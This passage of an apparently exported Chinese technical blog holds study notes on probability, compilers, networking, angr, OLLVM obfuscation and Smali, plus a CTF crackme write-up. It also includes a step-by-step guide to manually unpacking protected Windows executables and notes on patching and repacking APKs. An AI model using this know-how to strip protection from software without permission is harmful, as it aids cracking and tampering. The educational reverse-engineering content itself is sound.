乘法原理:完成一件工作,需要m个步骤,而第1步有n1种方法,…,第m步有nm种方法,依次完成这m步时这项工作才完成,那么完成这项工作共有N = n1 * n2 * ... * nm种不同的方法. 古典概型两大取法. 每次取完后放回,不改变样本空间. 每次取完后不放回,改变样本空间. 古典概型两大放法. 排列:n个不同元素中取出m个无重复元素,排成一列(有顺序关系). 组合:n个不同元素中取出m个无重复元素,不排列(没有顺序关系). 常用计算方法:对立事件概率和为1;概率的有限可加性;任意多个事件的和事件的概率计算公式. 条件概率设试验E的样本空间为S.A,B是事件,要考虑在A已经发生的条件下B发生的概率,这就是条件概率问题. 条件概率符合概率的三个基本性质.此外,条件概率具有无条件概率类似性质.当A = S时,P(B|S) = P(B),条件概率化为无条件概率. 计算条件概率有两种方法:公式法,直接带入公式求值;缩减样本空间法,在A发生的前提下确定B的缩减样本空间,并在其中计算B发生的概率,从而得到P(B|A). 由条件概率定义推广可得乘法定理. 全概率公式和贝叶斯公式样本空间的划分(集合的划分). 若B1,…,Bn是样本空间S的一个划分,则每次试验中,事件B1,…,Bn中必有一个且仅有一个发生.特别当n = 2时B1与B2互为对立事件. 全概率公式可以将一个复杂的事件A的概率通过一组划分变为若干个简单事件概率之和的形式. 若某事件是伴随着一个完备事件组的发生而发生,则马上联想到事件发生的概率用全概率公式计算. 贝叶斯公式(逆概公式)用于追查是何种原因(或情况,条件)下引发的概率. 独立性当A的发生对B的发生的概率没有影响时,有P(B|A) = P(B),由乘法公式有P(AB) = P(A)P(B|A) = P(A)P(B). 定义:设A,B是两事件,如果满足等式P(AB) = P(A)P(B),则称事件A与事件B是相互独立的事件. 零概率事件与任何事件都是相互独立的. 由对称性:A,B相互独立,必有B,A相互独立. 定义推广:设事件A1,A2,…,An对任意的1 &lt;= i &lt; j &lt;= n有P(AiAj) = P(Ai)P(Aj),则称这n个事件两两相互独立.如果对于任意的k(k &lt;= n),任意的1 &lt;= i1 &lt; i2 &lt; ... &lt; ik &lt;= n都有:P(Ai1Ai2...Aik) = P(Ai1)P(Ai2)...P(Aik),则称这n个事件相互独立. 若n个事件相互独立,必蕴含这n个事件两两相互独立,反之不真. 定理:设A,B是两事件,且P(A) &gt; 0,则A,B相互独立的充要条件是:P(B|A) = P(B). 结论一:若A,B相互独立,则A与非B,非A与B,非B与非A也相互独立. 结论二:若P(A) &gt; 0,P(B) &gt; 0,则A,B相互独立与A,B互不相容不能同时成立. 利用独立性计算古典概率 计算相互独立的积事件的概率:若已知n个事件A1,A2,…,An相互独立,则P(A1A2...An) = P(A1)P(A2)...P(An). 计算相互独立事件的和的概率:若已知n个事件A1,A2,…,An相互独立,则P(A1UA2U...UAn) = 1 - P(非A1非A2...非An).]]></content>
      <categories>
        <category>mathematics</category>
      </categories>
      <tags>
        <tag>probability-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-tool-angr基础]]></title>
    <url>%2Fposts%2F8f74c13f%2F</url>
    <content type="text"><![CDATA[概览angr是一个利用python开发的二进制程序分析框架,具有对二进制文件执行动态符号执行和各种静态分析的功能. 符号执行是在运行程序时用符号来替代真实值,由于符号是可变的,可以尽可能的将程序的每一条路径遍历,这样的话,必定存在至少一条能够输出正确结果的分支,每一条分支的结果都可以表示为一个离散关系式,使用约束求解引擎即可分析出正确结果,这就是符号执行的简单阐述. 符号执行的路径选择问题到现在依旧是一个很大的问题,当程序存在循环时,每次循环之后会形成至少两个分支,当循环的次数足够多时,就会造成路径爆炸. angr分析程序流程. 导入二进制文件. 建立状态. 定义符号变量并与二进制文件相联系. 建立simgr管理state. 通过active的变化来筛选. 获取目标状态的数值. 状态在angr寻找路径时,程序的当前状态有多种表示. 123456step()#向下执行一个block,产生active状态,表示该分支在执行中.run()#运行到结束,产生deadended状态,表示分支结束.explore()#对地址进行限制筛选路径,例如:sm.explore(find = [0x400676], avoid = [0x40073d]).产生found状态,表示探索的结果等等. 约束求解123456print sm.found.solver.eval(arg1, cast_to = str)#使用约束求解引擎获取命令行参数inp = sm.found.posix.files[0].all_bytes() print sm.found.solver.eval(inp, cast_to = str)#使用约束求解引擎获取标准输入 简单使用123456789101112131415161718192021import angrimport sysdef main(argv): project = angr.Project(argv[1]) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) print_good_address = 0x232323 simulation.explore(find = print_good_address) if simulation.found: solution_state = simulation.found[0] #获取一个筛选出来的状态 print solution_state.posix.dumps(sys.stdin.fileno()) #打印该状态的标准输入 else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv)]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-Windows-加壳与脱壳]]></title>
    <url>%2Fposts%2Fedf18c09%2F</url>
    <content type="text"><![CDATA[概览在一些计算机软件里有一段专门负责保护软件不被非法修改或反编译的程序,它们一般都是先于程序运行,拿到控制权,然后完成它们保护软件的任务.由于这段程序和自然界的壳在功能上有很多相同的地方,就把这样的程序称为壳了. 加壳加壳过的可执行文件依旧是可执行文件,它可以同正常的可执行文件一样执行.用户执行的实际上是外壳程序,这个外壳程序负责把用户原来的程序在内存中解压缩,并把控制权交还给解开后的真正程序,这一切工作都是在内存中运行的,整个过程对用户是透明的. 壳修改了原程序的执行文件的组织结构,从而能够比原程序的代码提前获得控制权,并且不会影响原程序的正常运行. 壳一般都修改了原程序文件的输入表,加壳后的输入表一般所引入的DLL和API函数都很少;壳出于保护原程序代码和数据的目的,一般都会加密原程序文件的各个区块;各类加壳软件,其压缩算法一般不是自己实现的,大多是调用其他的压缩引擎. 壳的加载一般壳的装载过程. 保护入口参数,ASPack一般是pushad. 用显式链接方式动态加载壳所需要使用的API地址,3个相关的重要函数:GetModuleHandle(返回指定模块的句柄),GetProcAddress(返回指定函数地址),LoadLibrary(加载动态链接库). 对原程序文件的各个区块数据解密,并把解密的区块数据按照区块的定义放在合适的内存位置,以让程序能正常运行.如果加壳时用到了压缩技术,那么在解密之前还有解压缩. IAT的初始化. 重定位项的处理. HOOK API. 跳转到程序原入口点. 常见压缩壳与加密壳加壳软件按照其加壳目的和作用,可分为压缩壳与加密壳. 压缩壳主要目的是减小程序体积,如ASPacK,UPX和PECompact等;加密壳主要目的是保护程序,用上了各种反跟踪技术保护程序不被调试,脱壳等,如ASProtect,Armadillo,EXECryptor等. 随着加壳技术的发展,这两类软件之间的界线越来越模糊,很多加壳软件除具有较强的压缩性能,同时也有了较强的保护性能. http://www.aspack.com/:ASPack可压缩Win32可执行文件以及库文件,文件压缩比率高达40% ~ 70%. http://upx.sourceforge.net/:UPX是一个以命令行方式操作的可执行文件经典免费压缩程序,开源. http://www.bitsum.com/:PECompact同样也是一款能压缩可执行文件的工具.相比同类软件,PECompact提供了多种压缩项目的选择,用户可以根据需要确定哪些内部资源需要压缩处理.同时,该软件还提供了加解密的插件接口功能. http://www.aspack.com/:ASProtect. http://www.ultraprotect.com/:ACProtect. http://www.siliconrealms.com:Armadillo. http://www.strongbit.com/:EXECryptor. http://www.obsidium.de/:Obsidium. http://pespin.w.interia.pl/:PESpin. http://www.polytech.ural.ru/:VMProtect. http://www.oreans.com/xprotector/:Xtreme-Protector. http://www.oreans.com:Themida/WinLicense. 自校检脱壳自检验大致分为以下几个类型. CreateFile型:调用CreatFileA(W)函数加载自身,然后通过GetFileSize获取文件大小,通过比较文件的大小来检测是否被脱壳.通过SetFilePointer来设置文件指针,然后通过ReadFile读取文件中的一些数据,来判断是否被脱壳(一般来说读取的时候附加数据).这种直接对API下断,基本就可以到达解密点. 内存型:对程序在内存中镜像进行CRC,MD5等检验,如果不相等则认为已脱壳或被修改.用PEID插件可以查看算法的所在位置,就可以到达解密点了. 脚本语言型:脚本编程语言指的是像autoit,autohotkey等语言.这种语言编译出来的程序一般都是天生带壳的,而且自校验是对附加数据进行多次细致的检查,如果不弄清楚检验过程,即使更改跳转也不能让程序正常运行. 壳校检型:在主程序中插入一些跳到壳地址中的代码,并返回一些无关紧要的数据或做无关紧要的操作.如果程序被脱壳了,这些代码执行的时候就会出现异常.出现异常后,在堆栈中找到返回的位置,nop掉相应的指令即可. 脱壳脱壳的一般流程是:查壳 -&gt; 寻找OEP -&gt; Dump -&gt; 修复. 首先用相关工具分析一下是什么壳,然后跟踪分析.文件分析工具有PEID,Exeinfo PE等. 一般压缩壳都有专用的脱壳机,而加密壳很少有,必须手工脱壳. 手工脱壳常用的工具. 调试器:SoftICE,TRW2000,Ollydbg,ImmunityDebugger等. 内存抓取工具:Procdump,LordPE等. 十六进制工具:010 Editor等. PE编辑工具:Procdump,PEditor等. 输入表重建工具:ImportReconstruction等. 脱壳过程中可以通过查看资源类型来大致判断源程序语言类型. 脱壳首先要确定OEP(原始入口点),决大多数PE加壳程序在被加密的程序中加上一个或多个段,所以跨段转移或跳转就有可能是跳往OEP. 然后要Dump内存中已经还原的文件,使用内存抓取工具即可.对于用Procdump之类的FULL DUMP功能脱壳的文件,要用Procdump或PEditor之类的PE编辑工具修正入口点. 使用Import REConstructor修复IAT表. 运行Import REConstructor和需要脱壳的应用程序,选择应用程序进程并填上OEP,点击IAT AutoSearch,出现Get Import按钮则表示输入的OEP发挥作用. 然后点击Get Import,让其分析IAT结构得到基本信息. 如果某个DLL显示valid :NO,点击Show Invalids分析所有的无效信息,在Imported Function Found栏中右键选择Trace Level1 (Disasm). 再次点击Show Invalids,如果成功,可以看到所有的DLL都为valid:YES.如仍有无效的地址,继续手动用右键的Level 2或Level 3修复. 如果还是出错,可以利用Invalidate function(s),Delete thunk(s),编辑Import表(双击函数)等功能手动修复. 之后开始修复已脱壳的程序,选择Add new section来为Dump出来的文件加一个Section. 点击Fix Dump,并选择Dump出来的文件,此时OEP也被修正.生成的文件可以跨平台运行.]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-hackergame-2018-confused-flxg]]></title>
    <url>%2Fposts%2Fa5fee3d1%2F</url>
    <content type="text"><![CDATA[逆向Exeinfo PE检测:Microsoft Visual C++ v14 - 2017 - ( x64 ) www.microsoft.com (exe 4883ec 28-48) [ Win Vista ],未加壳. IDA打开分析,从字符串(shift + f12)开始查找应用,找到加密逻辑. 加密逻辑很简单,先将输入进行标准的base64编码,接着进行翻转,将a[i]与i分别异或,最后与内存中的flag进行比较看是否一致. 双击字符串数组,接着shift + e导出加密后的flag.得到之后,用脚本解密即可. 脚本12345678910import base64enc = [0x39, 0x65, 0x45, 0x54, 0x77, 0x5F, 0x34, 0x5F, 0x64, 0x5F, 0x66, 0x68, 0x3C, 0x34, 0x58, 0x55, 0x7F, 0x43, 0x21, 0x4B, 0x7F, 0x20, 0x43, 0x76, 0x5F, 0x20, 0x4C, 0x4D, 0x7A, 0x53, 0x70, 0x7D, 0x56, 0x4D, 0x65, 0x47, 0x4C, 0x5D, 0x71, 0x43, 0x18, 0x6F, 0x47, 0x48, 0x42, 0x18, 0x1C, 0x4D, 0x74, 0x45, 0x01, 0x69, 0x00, 0x4D, 0x5B, 0x6D]x = ''flag = ''for i in range(len(enc)): x += chr(enc[i] ^ i)print base64.b64decode(x[::-1])]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-compiler-principles-词法分析]]></title>
    <url>%2Fposts%2Ffdc4f7ea%2F</url>
    <content type="text"><![CDATA[概览词法分析的任务:从左到右逐个字符地对源程序进行扫描,产生一个个的单词符号,把作为字符串的源程序改造成为由单词符号组成的中间程序.词法分析程序一般作为一个独立子程序. 单词符号一般包括的种类:关键字,标识符,常数,运算符,界符(分隔符). 词法分析器输出单词符号的形式:(单词种别,单词符号的属性值),单词种别通常用整数编码.词类编码提供给语法分析程序使用,单词自身的属性值提供给语义分析程序使用.具体的分类设计以方便语法分析程序使用为原则. 首先进行输入,输出预处理. 去除掉空白符,跳格符,回车符和换行符等编辑性字符. 去除程序中的注释符. 扫描缓冲区 然后进行单词符号的识别,可能涉及到超前搜索问题. 理论基础状态转换图状态转换图是一张有限方向图,在状态转换图中,结点代表状态,用圆圈表示.状态之间用箭弧连结,箭弧上的标记(字符,正规式)代表在射出结点状态下可能出现的输入字符或字符类.一个状态转换图可用于识别一定的字符串. 一张状态转换图只包含有限个状态(即有限个结点),其中含有一个初态(用双线箭头指示)和一个或以上个终态(用双圈表示).初态表示分析的开始,终态表示分析的结束. 正规式(正规表达式)与正规集正规表达式定义. ε,Φ都是Σ上的正规式,它们所表示的正规集分别为{ε}和Φ. 任何a属于Σ,a是Σ上的一个正规式,它所表示的正规集为{a}. 如果U,V都是Σ上的正规式,它们所表示的正规集分别记为L(U)和L(V),那么(U|V),(U*V)和(U)*也是正规式,它们所表示的正规集分别为L(U)并L(V),L(U)L(V)和(L(U))*. 仅由有限次使用上述步骤而得到的表达式才是Σ上的正规式,仅由这些正规式所表示的字集才是Σ上的正规集. 正规式的数学运算. 交换律:U|V = V|U.结合律:U|(V|W) = (U|V)|W,U(VM) = (UV)W.分配律:U(V|W) = UV|UW,(V|W)U = VU|WU.ε连接:εU = Uε = U. 定义正规表达式(regular expression)是以下的一种. 基本正规表达式由一个单字符a(a属于Σ),以及元字符ε或元字符Φ组成.在第1种情况下,L(a) = {a};在第2种情况下,L(ε) = {ε};在第3种情况下,L(Φ) = {}. r|s格式的表达式:其中r和s均是正规式.在这种情况下,L(r|s) = L(r) U L(s). rs格式的表达式:其中r和s均是正规式.在这种情况下,L(rs) = L(r)L(s). r*格式的表达式:其中r是正规式.在这种情况下,L(r*)= L(r)*. r格式的表达式:其中r是正规式.在这种情况下,L((r)) = L(r),因此,括号并不改变语言,它们只调整运算的优先权. |的优先权最低,连结次之,*则最高.另外还注意到在这个定义中,5个符号|,*,*,(和)都有了元字符的含义,正规式的连接一般不满足交换律. 确定有限自动机 状态转换矩阵:行表示状态,列表示输入字符,矩阵元素表示δ(s,a)的值. 确定有限自动机(DFA)的三种表示形式:状态转换函数;状态转换矩阵;状态转换图. 以下述方式递归扩张δ的定义:δ(s,ε) = s,δ(s,aα) = δ(δ(s,a),α)(a属于Σ,s属于S). 从状态转换图来看,对于Σ*上的任何字α,如果存在一条从初态结点到某一终态结点的通路,且这条通路上所有弧的标记符连接成的字等于α,则称α可为DFA M所识别(读出或接受). 如果M的初态结点同时又是终态结点,则空字ε可为DFA M所识别.DFA M所能识别的字的全体记为L(M). 非确定有限自动机 对于Σ*中的任何一个字α,若存在一条从某一初态结点到某一终态结点的通路,且这条通路上所有弧的标记字依序连接成的字(忽略那些标记为ε的弧)等于α,则称α可为NFA M所识别(读出或接受). 若M的某些结点既是初态结点又是终态结点,或者存在一条从初态结点到某一终态结点的ε通路,那么空字ε可为M所接受.NFA M所能识别的字的全体记为L(M). 定理:对于每个NFA M存在一个DFA M′,使得L(M) = L(M′). 证明思想:用M′的一个状态对应M的一个状态集合,用这种方法,能从一个NFA M构造一个DFA M′使得L(M) = L(M′),这种方法称作子集构造法. 重要证明由NFA构造DFA方法一,基于状态转化图的改造. 方法二,基于状态转化表的改造. 设I是有限自动机的状态集的子集,I的ε闭包ε_CLOSURE(I)定义如下. 如果状态q属于I,则q属于ε_CLOSURE(I)(既I中的状态全部属于ε_CLOSURE(I)). 如果状态q属于I,那么从状态q出发经过任意ε弧而能到达的任何状态q′都属于ε_CLOSURE(I)(可以连续经过多条ε弧). 假定I是非确定有限自动机的状态集的子集,则定义Ia = ε_CLOSURE(J),其中a属于Σ,J是从I中的某一状态结点出发经过一条a弧而达到的状态结点的全体. 假设Σ = {a1, a2, a3, ..., ak},构造状态转化表,表的构成. 每一行包含k + 1列,首行首列为ε_CLOSURE(X). 如果每行的第一列假定为I,则该行的i + 1列为Iai.然后检查该行的所有状态子集,将未曾在第一列出现的填入到后面空行的第一列. 重复第2步,直到出现在表的第i + 1列上的所有状态子集均在第一列中出现. 将构造出来的表视为状态转换矩阵,将其中的每个状态子集视为新的状态,显然该表唯一的刻画了一个DFA M,该有限自动机的初态为该表的首行首列,终态为那些包含原终态的状态子集.显然L(M&#39;) = L(M). 正规文法与有限自动机的等价性 对每个右线性正规文法GR或左线性正规文法GL,都存在一个有限自动机(FA)M,使得:L(M) = L(G). 对每一个FA M,都存在一个右线性正规文法GR和左线性正规文法GL,使得:L(M) = L(GR) = L(GL). 对于任何有限自动机M,都存在一个正规式r,使得L(r) = L(M);对于任何正规式r,都存在一个有限自动机M,使得L(M) = L(r). 证明:右线性正规文法GR同有限自动机的等价性. 设右线性正规文法GR = &lt;VT, VN, S, P&gt;.将VN中的每一非终结符号视为状态符号,并增加一个新的终结状态符号f,f不属于VN,构造有限自动机M = &lt;VN U {f}, VT, δ, S, {f}&gt;. 状态转换函数δ定义如下. 若对某个A属于VN且a属于VT U {ε},P中有产生式A → a,则令δ(A,a) = f. 对任意A属于VN且a属于VT U {ε},设P中左端为A,右端第一符号为a的所有产生式为:A → aA1|aA2|...|aAk(不包含A → a),则令δ(A,a) = {A1, A2, ..., AK}. 显然,由其状态转移函数可以看出该FA为NFA. 证明:左线性正规文法GL同有限自动机的等价性. 设左线性正规文法GL = &lt;VT, VN, S, P&gt;.将VN中的每一非终结符号视为状态符号,并且增加一个初态符号q0,q0不属于VN,构造有限自动机M = &lt;VN U {q0}, VT, δ, q0, {S}&gt;. 状态转换函数δ定义如下. 若对某个A属于VN且a属于VT U {ε},P中有产生式A → a,则令δ(q0,a) = A. 对任意的A属于VN且a属于VT U {ε},若P中所有右端第一符号为A,第二符号为a的产生式为:A1 → Aa,A2 → Aa,…,Ak → Aa,则令δ(A,a) = {A1, A2, ..., Ak}. 证明:有限自动机同正规文法的等价性. 设DFA M = &lt;S, Σ, δ, s0, F&gt;,构造右线性正规文法. 若s0不属于F,令GR = &lt;Σ, S, s0, P&gt;,其中P的产生式集合如下定义. 对任何a属于Σ及A,B属于S,若有δ(A,a) = B,当B不属于F时,令A → aB;当B属于F时,令A → a|aB. 对于w属于Σ*,不妨设w = a1a2...ak,其中ai属于Σ.若s0能推导出w,则存在一个最左推导s0 ⇒ a1A1 ⇒ a1a2A2 ⇒ ... ⇒ a1a2...ak,因而,在M中有一条从s0出发依次经过A1,…,Ak - 1达到终态的通路,该通路上所有箭弧依次标记为a1,a2,…,ak.反之亦然.所以w属于L(GR)当且仅当w属于L(M). 若s0属于F,因为δ(s0,ε) = s0,所以ε属于L(M),但ε不属于上面构造的GR产生的文法L(GR),L(GR) = L(M) - {ε}.所以在上面的GR中添加新的非终结符号s0′(s0′不属于S)和产生式s0′ → s0|ε,并用s0′代替s0作开始符号.这样修正后的文法GR′仍然是右线性正规文法,并且L(GR′) = L(M). 构造左线性正规文法,将终态视为开始符号,P的定义如下. 对任何a属于Σ及A1,A2属于VN,有δ(A1,a) = A2,若A1是初态,A2 → a|A1a;若A1不是初态,A2 → A1a. 如果有多个终态,需要引入新终态,将原来的终态连接到新终态,箭符上的标记符为ε,将新的终态作为左线性正规文法的开始符号,其产生式为f′ → f1|f2|.... 由前面可知:正规文法,正规式,确定有限自动机和非确定有限自动机在接受语言的能力上是一致的. 由NFA构造正规式r首先对NFA M状态转换图进行改造,在M中加入两个结点X,Y.从X用ε弧连接到M的所有初态结点;从M的所有终态结点用ε连接到Y,从而形成一个新的NFA,记为M′,它只有一个初态X和一个终态Y.显然,L(M) = L(M′).按下图消除M′中的所有结点,直至只剩X和Y. 由正规式r构造NFAThopmson方法:首先对r中运算符数目进行归纳证明. 若r具有0个运算符,则其状态转换图对应一个NFA. 当r具有i个运算时,有三种情况. 当r = r1 | r2,r2中的运算符个数少于k.由归纳假设,对ri存在Mi = &lt;Si, Σi, δi, qi, fi&gt;,使得L(Mi) = L(ri),并且Mi没有从终态出发的箭弧(i = 1, 2). 设S1与S2交集为空集,在S1与S2的并集中加入新状态q0,f0.则可以构造. M的状态转换图中不难看出,M中有一条从q0到f0的通路,当且仅当在M1中有一条从q1到f1的通路或在M2中有一条从q2到f2的通路.即:L(M) = L(M1) U L(M2) = L(r1) U L(r2) = L(r). 当r = r1r2,同上可知. 当r = r1*,同上可知. Thompson方法所构造的NFA的状态数和ε转换较多,可以采用下图方法减少. 确定的有限自动机的化简一个DFA M =(Σ, S, δ, s0, F)的化简是指寻找一个状态数比较少的DFA M′,使L(M) = L(M′).而且可以证明,存在一个最少状态的DFA M′,使L(M) = L(M′). 等价状态:设s,t属于S,若对任何w属于Σ*,δ(s，w)属于F当且仅当δ(t，w)属于F,则称s和t是等价状态.等价状态定义了状态集合上的等价关系,因此状态集合能被划分成等价类. 两个状态s和t等价应满足如下条件. 一致性条件,s和t必须同时或为终态或为非终态. 蔓延性条件,对于所有a属于Σ,δ(s, a) = r,δ(t, a) = q,r和q必须等价;相反,r和q不等价,则s和t不等价. 化简方法. LEX简介LEX原理. 单词的结构用正规式描述:正规式 =&gt; NFA =&gt; DFA =&gt; min DFA. 用LEX建立词法分析程序的过程:LEX源程序经过LEX编译程序编译成词法分析器L,输入串被词法分析器L分析为单词符号串. LEX源程序的组成包含两部分:正规定义式和识别规则.]]></content>
      <categories>
        <category>CS</category>
        <category>compiler-principles</category>
      </categories>
      <tags>
        <tag>compiler-principles</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-混淆与反混淆-OLLVM]]></title>
    <url>%2Fposts%2F59a6c39%2F</url>
    <content type="text"><![CDATA[OLLVMOLLVM(Obfuscator-LLVM)旨在提供一套开源的针对LLVM的代码混淆工具,以增加对逆向工程的难度. OLLVM是基于LLVM实现的,LLVM是一个编译器框架,采用经典的三段式设计:前端可以使用不同的编译工具对代码文件做词法分析以形成抽象语法树AST,然后将分析好的代码转换成LLVM的中间表示IR;中间部分的优化器只对中间表示IR操作,通过一系列的Pass对IR做优化;后端负责将优化好的IR解释成对应平台的机器码. OLLVM的混淆操作就是在中间表示IR层,通过编写Pass来混淆IR.OLLVM适用LLVM支持的所有语言和目标平台. OLLVM默认支持-fla,-sub,-bcf三个混淆参数,可以单独使用,也可以配合使用.-fla参数表示使用控制流平展(Control Flow Flattening)模式,-sub参数表示使用指令替换(Instructions Substitution)模式,-bcf参数表示使用控制流伪造(Bogus Control Flow)模式. Instructions Substitution指令替换是一种比较简单的混淆方式,OLLVM将一些简单的运算复杂化,但这种方式容易被代码优化给去除,目前OLLVM只实现对整数运算的混淆. control flow flatteningcontrol flow flattening通过多个case-swich结构将程序的控制流变成扁平形状,打破原有的逻辑结构,增加逆向的难度.OLLVM将源代码分割为几个基本块,并放在一个while循环结构中无限循环,程序的流程由一个变量控制. bogus control flowbogus control flow通过在源程序的控制流中添加一些基本块,这些基本块仅仅起了连接作用,并不影响实际的执行逻辑. Functions annotationsOLLVM的Functions annotations模式支持对单个函数进行混淆. 12int func() __attribute((__annotate__(("bcf"))));//对函数func()使用bcf混淆 OLLVM的fla,sub和bcf三个属性可以搭配使用,只需要添加对应的编译选项即可. 下载并编译1234567git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.gitmkdir buildcd buildcmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/make -j7cd ..build/bin/clang demo.c -o demo -mllvm -fla]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>混淆与反混淆</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-Android-Smali语法]]></title>
    <url>%2Fposts%2Fcba1550d%2F</url>
    <content type="text"><![CDATA[SmaliAndroid代码一般是用Java编写的,使用专门的Android虚拟机(5.0以下为Dalvik,5.0以上为ART)执行.Android虚拟机的可执行文件是dex文件.dex文件反编译之后就是Smali代码.Smali是Android虚拟机的反汇编语言. 通过修改Smali代码,再重新编译打包成新的APK来修改APK运行逻辑. 语法Smali数据类型. Smali Java 备注 v void 只能用于返回值类型 Z boolean B byte S short C char I int J long F float D double Lpackage/name; 对象类型 L表示这是一个对象类型,package表示该对象所在的包,;表示对象名称的结束 [&lt;type&gt; 数组 [I表示一个int型数组 Smali关键词. 关键词 说明 .class 定义Java类名 .super 定义父类名 .source 定义Java源文件名 .filed 定义字段 .method 定义方法开始 .end method 定义方法结束 .annotation 定义注解开始 .end annotation 定义注解结束 .implements 定义接口指令 .local 指定了方法内局部变量的个数 .registers 指定方法内使用寄存器的总数 .prologue 表示方法中代码的开始处 .line 表示Java源文件中指定行 .paramter 指定了方法的参数 .param 和.paramter含义一致,但是表达格式不同 Java中变量都是存放在内存中的,Android为了提高性能,变量都是存放在寄存器中的,寄存器为32位,可以支持任何类型.寄存器分为:本地寄存器,用v开头数字结尾的符号来表示,例如v0;参数寄存器,用p开头数字结尾的符号来表示,例如p0. 在非static方法中,p0代指this,p1为方法的第一个参数.在static方法中，p0为方法的第一个参数. 赋值与获取成员变量定义格式为:.field public/private [static][final] varName:&lt;type&gt;. 获取指令:iget,sget,iget-boolean,sget-boolean,iget-object,sget-object,aget. 赋值指令:iput,sput,iput-boolean,sput-boolean,iput-object,sput-object,aput. 123456789sget-object v0,Lcom/aaa;-&gt;ID:Ljava/lang/String;#获取ID这个String类型的成员变量并放到v0这个寄存器中.iget-object v0,p0,Lcom/aaa;-&gt;view:Lcom/aaa/view;#iget-object比sget-object多一个参数p0,这个参数代表变量所在类的实例,这里p0就是this..local v0, args:Landroid/os/Message;const/4 v1, 0x12iput v1,v0,Landroid/os/Message;-&gt;what:I#相当于java代码:args.what = 18;其中args为Message的实例. 函数函数定义格式. 12.method public/private [static][final] methodName()&lt;type&gt;.end method 函数分为两类:direct method和virtual method,direct method就是private方法,virtual method就是指其余的方法. 123456789101112.method private ifRegistered()Z .locals 2 // 本地寄存器的个数 .prologue const/4 v0, 0x1 //v0赋值为1 if-eqz v0, :cond_0 //判断v0是否等于0,等于0则跳到cond_0执行 const/4 v1, 0x1 //符合条件分支 :goto_0 //标签 return v1 //返回v1的值 :cond_0 //标签 const/4 v1, 0x0 //cond_0分支 goto :goto_0 //跳到goto_0执行.end method 函数调用指令:invoke-direct,invoke-virtual,invoke-static,invoke-super,invoke-interface. 函数调用格式:invoke-**** {arg1, arg2, ...}, Lpackage/name;-&gt;funName(Lpackage/name;,...)Lpackage/name.如果不是是静态方法,arg1代表调用该方法的实例. 123const-string v0, "Eric"invoke-static &#123;v0&#125;, Lcmb/pbi;-&gt;t(Ljava/lang/String;)Ljava/lang/String;move-result-object v2 Smali需要用指令move-result或move-result-object来保存函数返回的结果.]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-computer-network-基础]]></title>
    <url>%2Fposts%2Fa7b37309%2F</url>
    <content type="text"><![CDATA[互联网简介三大类网络:电信网络,有线电视网络,计算机网络. 计算机网络主要是由一些通用的,可编程的硬件互连而成的,可编程的硬件能够用来传送多种不同类型的数据,并能支持广泛的和日益增长的应用. 从本质上看计算机网络由若干结点和连接这些结点的链路组成.通过路由器把网络互连起来,这就构成了一个覆盖范围更大的计算机网络,称之为互连网(internet). 因特网(Internet,互联网)是遵循TCP/IP协议族,利用路由器将各种计算机网络互连起来而形成的,一个覆盖全球的,特定的互连网,是世界上最大的计算机网络.互联网(因特网)具有两个重要基本特点:连通性与共享. 现在,任何机构和个人只要向某个互联网服务提供者ISP交纳规定的费用,就可从该ISP获取所需IP地址的使用权,并通过该ISP接入到互联网.根据提供服务的覆盖面积大小以及所拥有的IP地址数目的不同,ISP也分成为不同层次的ISP:主干ISP,地区ISP和本地ISP. 万维网是一个大规模的,联机式的信息储藏所.使用链接的方法,能非常方便地从互联网上的一个站点访问另一个站点,从而主动地按需获取丰富的信息. 互联网的标准化工作对互联网的发展起到了非常重要的作用:所有互联网标准都以RFC的形式在互联网上发表;成为互联网正式标准要经过三个阶段:互联网草案(有效期六个月);建议标准(成为RFC文档);互联网标准(达到正式标准后会分配到一个编号STD xxxx.一个标准可以和多个RFC文档关联).现在简化为二个阶段:建议标准,互联网标准. 除了建议标准和互联网标准这两种RFC文档外,还有三种RFC文档,即历史的,实验的和提供信息的RFC文档. 互联网的组成互联网由边缘部分和核心部分组成. 边缘部分:由所有连接在互联网上的主机组成,用户直接用来通信和资源共享.这些主机又叫端系统. 核心部分:由大量网络和连接这些网络的路由器组成.这部分是为边缘部分提供服务的(提供连通性和交换). 端系统在功能上可能有很大的差别,所有具有可编程的硬件的系统都可以作为端系统. 边缘部分端到端的通信:运行在主机A上的某个进程和运行在主机B上的另一个进程进行通信,简称主机间通信. 两类端系统之间的通信方式:Client/Server方式,简称为C/S方式;Peer-to-Peer方式,简称为P2P方式. C/Sclient和server都是指通信中所涉及的两个应用进程,C/S方式所描述的是进程之间服务和被服务的关系,客户是服务的请求方,服务器是服务的提供方. 客户端主动向远地服务器发起通信(请求服务),所以客户程序必须知道服务器程序的地址(在互联网中就是IP).服务器是一种专门用来提供某种服务的程序,被动等待并接受来自客户端的通信请求,需要同时处理多个远地或本地客户的请求,服务器事先不需要知道客户程序的地址. 客户与服务器的通信关系建立后,通信可以是双向的,客户端和服务器都可发送和接收数据. P2P对等连接P2P是指两个主机在通信时并不区分哪一个是服务请求方还是服务提供方,只要两个主机都运行了对等连接软件就可以进行平等的,对等的连接通信. 对等连接方式从本质上看仍然是使用客户服务器方式,只是对等连接中的每一个主机既是客户又是服务器.例如:主机C请求D的服务的同时向F提供服务.对等连接工作方式可支持大量对等用户同时工作. 